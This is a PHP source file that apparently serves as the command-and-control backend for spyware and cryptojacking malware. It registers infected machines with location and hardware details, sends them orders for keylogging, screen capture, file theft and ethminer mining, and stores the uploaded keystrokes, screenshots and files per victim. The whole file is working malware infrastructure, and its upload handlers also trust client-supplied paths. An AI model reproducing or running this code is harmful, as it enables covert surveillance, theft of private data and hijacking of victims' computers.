<?php

error_reporting(E_ALL);
ini_set('display_errors', 'On');

session_start();
require_once '../autoload.php';
include '../connect.php';
include 'phpFunctions.php';

$validUrl = "http://localhost/";
$latestProgramVersion = "1.0.0.0";
$ethminerUrl = $validUrl . "miners/ethminer-0.16.0.dev3-windows-amd64.zip";
if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"])) {
	// Get Latest Program Version
	if ($_POST["operation"] == "getLatestProgramVersion") {
		echo $latestProgramVersion;
	}
	// Get Latest Ethminer URL
	if ($_POST["operation"] == "getLatestEthminerURL") {
		echo $ethminerUrl;
	}
	// Get valid base URL
	if ($_POST["operation"] == "getValidUrl") {
		echo $validUrl;
	}
	// Initialize
	if ($_POST["operation"] == "initialize") {
		$coordinates = json_decode($_POST["coordinates"], true);
		$latitude    = $coordinates["lat"];
		$longitude   = $coordinates["lon"];
		$machineID = getValidMachineID($conn);
		require 'connect.php';
		$stmt        = $conn->prepare("INSERT INTO command (`machineID`,`password`,`system`,`programVersion`,`latitude`,`longitude`, `first_signal`, `last_signal`) VALUES (?,?,?,?,?,? , CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)");
		$stmt->bind_param("ssssdd", $machineID, hash('sha256', mysqli_real_escape_string($conn, $_POST["password"])), $_POST["system"], $_POST["programVersion"], $latitude, $longitude);
		$stmt->execute();
		$stmt      = $conn->prepare("INSERT INTO `specs` (`machineID`, `account`, `os`, `language`, `motherboard`, `memory`, `bios`, `cpu`, `gpu`, `audio`, `network`, `harddrives`, `cdrom`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);");
		$stmt->bind_param("sssssssssssss", $machineID, $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"]);
		$stmt->execute();
		mkdir("machines/$machineID", 0700);
		mkdir("machines/$machineID/keys", 0700);
		mkdir("machines/$machineID/screens", 0700);
		mkdir("machines/$machineID/files", 0700);
		echo $machineID;
	}
	if (isset($_POST["machineID"]) && isset($_POST["password"]) && checkPassword($conn, $_POST["machineID"], $_POST["password"])) {
		updateTimestamp($conn, $_POST["machineID"]);
		// Update machine data
		if ($_POST["operation"] == "updateHardwareData") {
			require 'connect.php';
			$stmt = $conn->prepare("UPDATE specs SET account=?, os=?, language=?, motherboard=?, memory=?, bios=?, cpu=?, gpu=?, audio=?, network=?, harddrives=?, cdrom=? WHERE machineID=?");
			$stmt->bind_param("sssssssssssss", $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"], $_POST["machineID"]);
			$stmt->execute();
			$stmt = $conn->prepare("UPDATE command SET inspectHardware=0 WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
		}
		// Uninstalled
		elseif ($_POST["operation"] == "uninstalled") {
			require 'connect.php';
			$stmt = $conn->prepare("DELETE FROM command WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			$stmt = $conn->prepare("DELETE FROM specs WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			deleteDir("machines/" . $_POST["machineID"], 0700);
		}
		// Update Status Info
		elseif ($_POST["operation"] == "updateStatusInfo") {
			require 'connect.php';
			$stmt = $conn->prepare("UPDATE command SET programVersion=?, lat=?, lon=?, last_signal=CURRENT_TIMESTAMP WHERE machineID=?");
			$stmt->bind_param("sdds", $_POST["programVersion"], $_POST["lat"], $_POST["lon"], $_POST["machineID"]);
			$stmt->execute();
		}
		// Get Orders
		elseif ($_POST["operation"] == "getOrders") {
			require 'connect.php';
			$stmt = $conn->prepare("SELECT * FROM command WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			$result = $stmt->get_result();
			while ($row = $result->fetch_assoc()) {
				$orders->inspectHardware       = $row["inspectHardware"];
				$orders->inspectFiles          = $row["inspectFiles"];
				$orders->ordersInterval        = $row["ordersInterval"];
				$orders->keylogger             = $row["keylogger"];
				$orders->screenCapture         = $row["screenCapture"];
				$orders->screenCaptureInterval = $row["screenCaptureInterval"];
				$orders->filesCapture          = $row["filesCapture"];
				$orders->mining                = $row["mining"];
				$orders->uninstall             = $row["uninstall"];
				echo json_encode($orders);
			}
		}
		// Get interesting files
		elseif ($_POST["operation"] == "getInterestingFiles") {
			require 'connect.php';
			$stmt = $conn->prepare("SELECT interestingFiles FROM command WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			$result = $stmt->get_result();
			while ($row = $result->fetch_assoc()) {
				echo $row["interestingFiles"];
			}
		}
		// Notify files upload completed
		elseif ($_POST["operation"] == "notifyFilesUploadCompleted") {
			require 'connect.php';
			$stmt = $conn->prepare("UPDATE command SET filesCapture=0 WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			$stmt = $conn->prepare("UPDATE command SET interestingFiles='' WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
		}
		// Upload index file
		elseif ($_POST["operation"] == "uploadIndexFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
			require 'connect.php';

			$filesPath = "/machines/" . $_POST['machineID'] . "/files/";
			recursiveMakeDir("", $filesPath);

			$stmt = $conn->prepare("UPDATE command SET inspectFiles=0 WHERE machineID=?");
			$stmt->bind_param("s", $_POST["machineID"]);
			$stmt->execute();
			$temp_location = $_FILES["file"]["tmp_name"];
			$new_location = "/machines/" . $_POST['machineID'] . "/" . $_FILES["file"]["name"];
			move_uploaded_file($temp_location, $new_location);
		}
		// Upload file
		elseif ($_POST["operation"] == "uploadFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
			$temp_location = $_FILES["file"]["tmp_name"];
			$filesPath = "/machines/" . $_POST['machineID'] . "/files/";

			recursiveMakeDir($filesPath, $_POST['localPathFile']);

			$new_location = $filesPath . $_POST['localPathFile'] . "/" . $_FILES["file"]["name"];
			move_uploaded_file($temp_location, $new_location);
		}
		// Upload screen
		elseif ($_POST["operation"] == "uploadScreen" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
			$temp_location = $_FILES["file"]["tmp_name"];
			$new_location = "/machines/" . $_POST['machineID'] . "/screens/" . $_FILES["file"]["name"];
			move_uploaded_file($temp_location, $new_location);
		}
		// Upload keys
		elseif ($_POST["operation"] == "uploadKeys" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
			$temp_location = $_FILES["file"]["tmp_name"];
			$new_location = "/machines/" . $_POST['machineID'] . "/keys/" . $_FILES["file"]["name"];
			move_uploaded_file($temp_location, $new_location);
		}
	}
}
